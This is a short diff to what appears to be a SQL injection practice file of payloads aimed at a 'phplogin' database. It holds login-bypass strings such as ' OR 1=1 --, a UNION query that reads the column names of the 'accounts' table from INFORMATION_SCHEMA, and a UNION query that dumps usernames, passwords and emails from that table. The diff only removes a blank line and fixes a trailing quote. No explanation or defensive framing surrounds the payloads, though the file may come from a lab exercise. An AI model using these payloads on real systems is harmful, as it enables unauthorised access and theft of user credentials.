@@ -1,4 +1,3 @@
-
 -- SQLI test query
 ' OR 1=1 -- 
 ' OR '1'='1
@@ -18,7 +17,7 @@
 -- Get Columms names
 ' UNION SELECT COLUMN_NAME, NULL, NULL, NULL, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'phplogin' AND TABLE_NAME = 'accounts' --
 
-' UNION SELECT id, username, password, email, NULL, NULL FROM phplogin.accounts --'
+' UNION SELECT id, username, password, email, NULL, NULL FROM phplogin.accounts -- 
 
 
 -----------------------------------------------------------SQL CREATE STATEMENT------------------------------------------------------------------------------------
